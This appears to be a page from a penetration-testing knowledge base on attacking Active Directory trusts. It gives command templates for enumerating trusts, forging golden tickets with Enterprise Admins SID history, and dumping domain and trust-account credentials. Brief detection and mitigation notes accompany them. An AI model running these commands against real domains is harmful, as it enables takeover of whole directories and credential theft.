---
title: Domain & forest trusts
category: AD / Trusts
order: 10
tags: [trusts, sid-history, sid-filtering, forest, raisechild, enterprise-admins]
summary: >
  Trusts let principals in one domain access another. Inside a forest SID
  filtering is off, so a child-domain compromise → Enterprise Admin via SID
  history. Across a forest SID filtering usually blocks that, but ACLs, foreign
  memberships and delegation still cross.
prerequisites:
  - Domain Admin (or krbtgt) in the starting domain for the SID-history forge
  - Enumerated trusts and their direction / transitivity / SID-filtering state
tools: [netexec, impacket (raiseChild, ticketer, secretsdump), PowerView, BloodHound]
detection:
  - Golden tickets with cross-domain extra SIDs (4769 with SIDHistory); inter-realm TGTs from odd hosts
mitigation:
  - Enable SID filtering / quarantine on trusts; selective authentication; treat the forest as the security boundary
refs:
  - { label: "harmj0y — a guide to trusts", url: "https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/" }
  - { label: "The Hacker Recipes — trusts", url: "https://www.thehacker.recipes/ad/movement/trusts" }
---

## Enumerate

```sh
netexec ldap $dc_ip -u $user -p $password -M enum_trusts
```

```powershell
Get-DomainTrust ; Get-ForestTrust      # PowerView: direction, transitivity, type
```

Note each trust's **direction** (in/out/bi), **transitivity**, and whether **SID
filtering** is enforced (intra-forest: no; inter-forest: usually yes).

## Child → parent (intra-forest) — SID history

The forest is the real boundary: SID filtering is **not** applied inside it, so a
golden ticket with an extra SID of the parent's **Enterprise Admins** (RID 519)
makes you EA.

```sh
# impacket automates it: dump child krbtgt, forge with EA SID, DCSync the parent
raiseChild.py $domain/$user:$password
```

```sh
# manual forge: extra SID = <parent_root_domain_SID>-519
ticketer.py -nthash <child_krbtgt_nt> -domain-sid <child_domain_sid> -domain $domain \
  -extra-sid <parent_domain_sid>-519 administrator
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass <parent_dc_fqdn> -just-dc
```

## Across a forest trust

SID filtering strips injected SIDs, so SID history won't cross. What still does:

- **Foreign principals** — accounts/groups from your domain granted access or
  group membership in the other forest (hunt them in BloodHound).
- **ACLs across the trust** — ACEs on objects that name a foreign principal.
- **Kerberoast / AS-REP** across the trust; **unconstrained delegation** + trust.
- **Trust key** — DCSync the trust account (`<DOMAIN>$`) to forge inter-realm
  referral TGTs (still bounded by SID filtering).

```sh
# get the trust key (inter-realm) from the trusting DC
secretsdump.py $domain/$user:$password@$dc_ip -just-dc-user "$domain_nb\\<TRUSTED_DOMAIN>$"
```

> Map trust attack paths in BloodHound (it models cross-domain edges) rather than
> reasoning about them by hand — foreign-group membership is easy to miss.
